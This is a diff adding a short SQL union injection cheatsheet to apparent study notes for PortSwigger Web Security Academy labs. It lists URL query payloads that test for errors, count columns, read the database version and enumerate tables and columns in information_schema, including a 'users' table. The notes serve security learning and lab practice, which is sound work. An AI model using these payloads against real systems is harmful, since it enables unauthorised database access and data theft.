@@ -404,6 +404,31 @@ https://ac051f311f52f43a801c355e00500006.web-security-academy.net/filter?categor
 
 ## SQL Union Injection Cheatsheet
 
+My simple cheatsheet:
+
+```text
+# Check SQL Feedback/Return
+?id='
+
+# Check the amount of columns
+?id=1 order by 1
+?id=1 order by 2
+?id=1 order by 3
+
+# Error
+?id=1 order by 4
+?id=1 union all select 1, 2, 3
+
+# Determine the DBMS
+?id=1 union all select 1, 2, @@version
+
+# Enumerate Tables
+?id=1 union all select 1, 2, table_name from information_schema.tables
+
+# Gather information from a table
+?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'
+```
+
 This cheat sheet is from [here](https://github.com/areyou1or0/OSCP/blob/master/Web).
 
 ```text
